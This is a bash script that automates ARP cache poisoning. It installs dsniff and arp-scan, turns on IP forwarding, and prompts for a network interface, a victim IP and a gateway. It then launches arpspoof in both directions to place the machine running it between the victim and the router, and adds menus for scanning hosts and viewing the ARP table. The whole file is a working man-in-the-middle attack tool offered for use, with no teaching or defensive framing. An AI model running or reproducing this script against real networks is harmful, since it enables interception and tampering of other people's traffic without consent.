#!/usr/bin/bash

# Developed by HHY 
# font
bold=$(tput bold)
normal=$(tput sgr0)

# colors                                                                                        
NC='\033[0m'
Red='\033[0;91m'
Cyan='\033[0;96m'
Green='\033[0;92m'
Purple='\033[0;95m'

spinner() {
    local i sp n
    sp='/-\|'
    n=${#sp}
    printf ' '
    while sleep 0.1; do
        printf "%s\b" "${sp:i++%n:1}"
    done
}

root() {     
    clear
    if [ "$EUID" -ne 0 ]; then 
        echo -e "${Red}${bold}Not running as root...${NC}${normal}";
        echo "" ;
        sudo "$0" "$@"
        exit
    fi
}

requirements() {
    echo -e "${Green}${bold}Checking and installing requirements...${NC}${normal}";
    sudo apt-get update > /dev/null
    sudo apt-get install -y xterm dsniff arp-scan net-tools > /dev/null
    
    echo -e "${Green}${bold}Enabling IP Forwarding...${NC}${normal}"; 
    echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null
}

netstats() {
    printf "${Purple}"
    echo -e "${bold}----[Net-Stats]----"
    echo
    sudo ip addr | awk '/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print iface" : "a[1] }'
    IP=$(/sbin/ip route | awk '/default/ { print $3 }' | head -n 1)
    echo "Default Gateway : $IP ${normal}"
    echo
}

backmenu() {
    read -r -p 'Press 1 to return to main menu...' responsecl
    case "$responsecl" in 
        ([1]) clear; main ;;
        (*) sleep 1; clear; main ;;
    esac
}

main() {
    chmod +x ./banner.sh
    ./banner.sh
    netstats

    printf "${Purple}${bold}"
    PS3=': '
    options=("Poison" "Arp Table" "Hosts Scan" "Quit")
    select opt in "${options[@]}"
    do
        case $opt in
            "Poison")
                clear
                ./banner.sh
                netstats
                printf "${Purple}${bold}"
                read -p 'Interface (e.g., wlp3s0): ' inter
                read -p 'Victim IP: ' vict
                read -p 'Default Gateway: ' gate
                
                # --- FIX 1: Clean spaces from input ---
                inter=$(echo "$inter" | xargs)
                vict=$(echo "$vict" | xargs)
                gate=$(echo "$gate" | xargs)
                
                # --- FIX 2: Force MAC resolution using arp-scan ---
                # Standard pings often fail; arp-scan is more reliable for "quiet" hosts
                echo -e "${Cyan}Forcing MAC resolution for $vict...${NC}"
                sudo arp-scan --interface="$inter" "$vict" --quiet --retry=5 > /dev/null
                sudo arp-scan --interface="$inter" "$gate" --quiet --retry=5 > /dev/null
                
                echo
                echo "Poisoning active. Close the new window to stop."
                
                # --- FIX 3: Single window poisoning with -r and -hold ---
                # Using one window with -r is more stable than two separate windows
                sudo xterm -hold -T "Poisoning $vict" -e arpspoof -i "$inter" -t "$vict" -r "$gate" &
                
                wait
                backmenu
            ;;
            "Arp Table")
                clear
                ./banner.sh
                netstats
                sudo arp -a 
                backmenu
            ;;
            "Hosts Scan")
                clear
                ./banner.sh
                netstats
                read -p 'Interface: ' scanint
                scanint=$(echo "$scanint" | xargs)
                sudo arp-scan --interface="$scanint" --localnet
                backmenu
            ;;
            "Quit") clear; exit ;;
            *) echo "Invalid option"; sleep 1; clear; main ;;
        esac
    done
}

root
requirements       
clear
main
